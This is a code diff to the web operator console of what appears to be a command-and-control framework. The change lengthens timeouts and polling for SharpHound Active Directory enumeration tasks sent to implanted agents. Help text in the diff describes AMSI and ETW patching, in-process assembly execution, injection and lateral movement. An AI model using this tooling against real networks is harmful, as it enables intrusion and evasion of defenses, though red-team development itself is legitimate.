@@ -3434,7 +3434,7 @@ async function runCtxAction(act) {
         const stealthFlag = stealth ? ' --Stealth' : '';
         const ldapFlag = method === 'DCOnly' ? ' --DCOnly' : '';
         const args = `-c ${method}${stealthFlag}${ldapFlag}${bhDomainArg(domain)} --ZipFileName bh_${method.toLowerCase()}.zip`;
-        runDotnetExec(aid, 'SharpHound.exe', args, `SharpHound -c ${method} --Domain ${domain}`);
+        runDotnetExec(aid, 'SharpHound.exe', args, `SharpHound -c ${method} --Domain ${domain}`, {timeoutSec: 900});
       });
       break;
     }
@@ -3462,7 +3462,7 @@ async function runCtxAction(act) {
         if (vals.ldapuser) parts.push(`--LDAPUser ${vals.ldapuser}`);
         if (vals.ldappass) parts.push(`--LDAPPass ${vals.ldappass}`);
         if (vals.stealth)  parts.push('--Stealth');
-        runDotnetExec(aid, 'SharpHound.exe', parts.join(' '), `SharpHound -c ${vals.collection}`);
+        runDotnetExec(aid, 'SharpHound.exe', parts.join(' '), `SharpHound -c ${vals.collection}`, {timeoutSec: 900});
       });
       break;
     }
@@ -8460,7 +8460,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • CLR nativo en-proceso vía ICorRuntimeHost + AppDomain.Load_3 (sin Donut, sin proceso sacrificial)
   • Captura Console.Write/WriteLine mediante DirectWriter P/Invoke (WriteFile directo, sin buffering)
   • AMSI y ETW parcheados antes de cargar el assembly
-  • Timeout de 3 minutos; los errores del assembly se capturan como output
+  • SharpHound puede tardar hasta 15 minutos; el resto usa un límite de 60 s
 
   <span class="console-section">DIFERENCIAS vs dotnet-asm / clrstomp</span>
   dotnet-asm  → Donut + proceso sacrificial nuevo (CLR invisible en el agente)
@@ -8469,7 +8469,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">NOTAS</span>
   • El assembly corre en el AppDomain por defecto del agente
-  • Sin proceso nuevo — el agente sigue vivo si el assembly cuelga (timeout 3 min)
+  • Sin proceso nuevo — el agente sigue vivo si el assembly cuelga (timeout acotado)
   • Equivalente a: Cobalt Strike execute-assembly / Havoc dotnet inline-execute`,
 
   'clrstomp': `<b>clrstomp</b> — .NET in-process vía CLR stomping (sin Donut, sin proceso nuevo)
@@ -9283,7 +9283,7 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   • Native in-process CLR via ICorRuntimeHost + AppDomain.Load_3 (no Donut, no sacrificial process)
   • Captures Console.Write/WriteLine via DirectWriter P/Invoke (direct WriteFile, no buffering)
   • AMSI and ETW patched before loading the assembly
-  • 3-minute timeout; assembly errors are captured as output
+  • SharpHound may take up to 15 minutes; other assemblies use a 60-second limit
 
   <span class="console-section">DIFFERENCES vs dotnet-asm / clrstomp</span>
   dotnet-asm  → Donut + new sacrificial process (CLR invisible in agent)
@@ -9292,7 +9292,7 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
 
   <span class="console-section">NOTES</span>
   • Assembly runs in the agent's default AppDomain
-  • No new process — agent stays alive if assembly hangs (3 min timeout)
+  • No new process — agent stays alive if assembly hangs (bounded timeout)
   • Equivalent to: Cobalt Strike execute-assembly / Havoc dotnet inline-execute`,
 
   'clrstomp': `<b>clrstomp</b> — .NET in-process via CLR stomping (no Donut, no new process)
@@ -9898,7 +9898,7 @@ async function fetchSCFile(name) {
 
 // ── AD attack helper — fetch .NET assembly and queue DOTNET_EXEC ──────────────
 // Returns the task_id on success, null on failure.
-async function runDotnetExec(agentID, toolName, toolArgs, label) {
+async function runDotnetExec(agentID, toolName, toolArgs, label, options = {}) {
   const lbl = label || `${toolName} ${toolArgs}`.trim();
   addConsoleOutputForAgent(agentID, `[*] ${lbl}…`, '', null);
   let asmBytes;
@@ -9913,12 +9913,19 @@ async function runDotnetExec(agentID, toolName, toolArgs, label) {
   const b64 = u8ToB64(new Uint8Array(asmBytes));
   const r = await api('POST', `/api/agents/${agentID}/task`, {
     type: 'DOTNET_EXEC',
-    args: JSON.stringify({asm: b64, args: toolArgs, type: '', method: ''}),
+    args: JSON.stringify({asm: b64, args: toolArgs, type: '', method: '',
+      timeout_sec: Number(options.timeoutSec) || 0}),
   });
   if (!r?.ok) { toast(`Failed to queue ${lbl}`, 'red'); return null; }
   const tid = r.data?.task_id;
   addConsoleOutputForAgent(agentID, `[+] ${lbl} → task #${tid}`, '', null);
-  if (tid) pollResult(tid, agentID);
+  if (tid) {
+    if (Number(options.timeoutSec) > 120) {
+      addConsoleOutputForAgent(agentID, `[~] ${lbl} puede tardar varios minutos; la tarea sigue activa mientras SharpHound enumera LDAP…`, '', null);
+    }
+    const pollMs = Number(options.timeoutSec) > 0 ? (Number(options.timeoutSec) + 30) * 1000 : 120000;
+    pollResult(tid, agentID, pollMs);
+  }
   return tid;
 }
 
@@ -10080,7 +10087,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     return;
   }
 
-  let taskType = '', taskArgs = '', payload = '';
+  let taskType = '', taskArgs = '', payload = '', taskPollTimeoutMs = 120000;
 
   switch(cmd.toLowerCase()) {
     case 'shell': taskType='SHELL'; taskArgs=args; break;
@@ -10610,7 +10617,13 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         const asmBytes = await fetchSCFile(edFile);
         const b64 = u8ToB64(new Uint8Array(asmBytes));
         taskType = 'DOTNET_EXEC';
-        taskArgs = JSON.stringify({asm: b64, args: edArgs, type: '', method: ''});
+        const longRunning = /sharphound/i.test(edFile);
+        taskArgs = JSON.stringify({asm: b64, args: edArgs, type: '', method: '',
+          timeout_sec: longRunning ? 900 : 0});
+        if (longRunning) {
+          taskPollTimeoutMs = 930000;
+          addConsoleOutput('[~] SharpHound puede tardar varios minutos; la tarea sigue activa mientras enumera LDAP…', '', null);
+        }
         addConsoleOutput(`[+] ${edFile}: ${asmBytes.byteLength} bytes → DOTNET_EXEC`, '', null);
       } catch(e) { addConsoleOutput('', 'dotnet-exec error: '+e.message, null); return; }
       break;
@@ -10853,7 +10866,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (taskType === 'JUMP' || taskType === 'LATERAL') {
         _jumpTaskMap[tid] = {agentID, type: taskType, args: taskArgs, payload};
       }
-      pollResult(tid, agentID);
+      pollResult(tid, agentID, taskPollTimeoutMs);
     }
   } catch(e) {
     addConsoleOutput('', 'Network error: ' + e.message, null);
@@ -10919,17 +10932,20 @@ function ishellUpdateUI(agentID) {
   }
 }
 
-async function pollResult(taskID, agentID) {
+async function pollResult(taskID, agentID, timeoutMs = 120000) {
   const aid = agentID || activeAgent?.id;
   if (!aid) return;
   const key = `${aid}-${taskID}`;
   if (pollTimers[key]) return;
   pollTimers[key] = true;
-  for (let i = 0; i < 60; i++) {
+  const deadline = Date.now() + Math.max(10000, Number(timeoutMs) || 120000);
+  let resultReceived = false;
+  while (Date.now() < deadline) {
     await sleep(2000);
     try {
       const r = await api('GET', `/api/agents/${aid}/results/${taskID}`);
       if (r.ok && r.data) {
+        resultReceived = true;
         const out = r.data.output || '';
         const err = r.data.error  || '';
         // Auto-retry jump tasks when agent doesn't know the task type (one retry only)
@@ -10995,6 +11011,9 @@ async function pollResult(taskID, agentID) {
         return;
       }
     } catch(e) {}
+  }
+  if (!resultReceived) {
+    addConsoleOutputForAgent(aid, `[!] La tarea #${taskID} no terminó dentro del tiempo de espera; revisa el estado del agente.`, '', null);
   }
   delete pollTimers[key];
 }
